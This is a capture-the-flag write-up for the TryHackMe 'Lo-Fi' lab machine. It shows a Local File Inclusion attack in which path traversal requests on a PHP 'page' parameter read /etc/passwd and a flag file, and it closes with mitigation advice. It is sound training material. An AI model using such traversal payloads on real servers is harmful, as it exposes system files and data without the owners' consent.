
# TryHackMe – Lo-Fi Write-Up

**Machine Name**: Lo-Fi  
**Difficulty**: Easy  
**Category**: Web  
**IP**: `10.10.40.57`  

---

## Summary

This machine presented a classic **Local File Inclusion (LFI)** vulnerability in a PHP web application. By manipulating the URL parameters, I was able to read arbitrary files on the server, including the system’s `/etc/passwd` and ultimately retrieve the flag from `flag.txt`.

---

## Recon

### Step 1: Access the Target Website

I began by browsing the web server hosted at:

```
http://10.10.40.57
```

The page displays a Lo-Fi themed site with links like:

```
http://10.10.40.57/?page=Relax
```

Clicking around revealed a pattern in the URL — the `page` parameter was being used to dynamically load content. This is a common setup vulnerable to **Local File Inclusion (LFI)**.

---

## Exploitation

### Step 2: Test for LFI

To test for LFI, I tried accessing the Linux password file using relative path traversal:

```
http://10.10.40.57/?page=../../../../../etc/passwd
```

And successfully got the following output:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
...
www-data:x:33:33:www-data:/var/www:/bin/sh
...
```

This confirmed that the server was vulnerable to Local File Inclusion.

---

## Capture the Flag

### Step 3: Locate and Read the Flag

Knowing that LFI was possible, I guessed a potential location for the flag file:

```
http://10.10.40.57/?page=../../../../../flag.txt
```

The server responded with:

```
flag{.............}
```

---

## Conclusion

The Lo-Fi machine was successfully pwned using a simple LFI vulnerability. This exercise highlights the importance of validating and sanitizing user input in URL parameters, especially when including files dynamically.

---

## Mitigation

To prevent LFI vulnerabilities:

- Avoid directly including files based on user input.
- Sanitize and whitelist valid inputs.
- Disable error messages in production.
- Use frameworks or routing systems that abstract file inclusion logic securely.

---
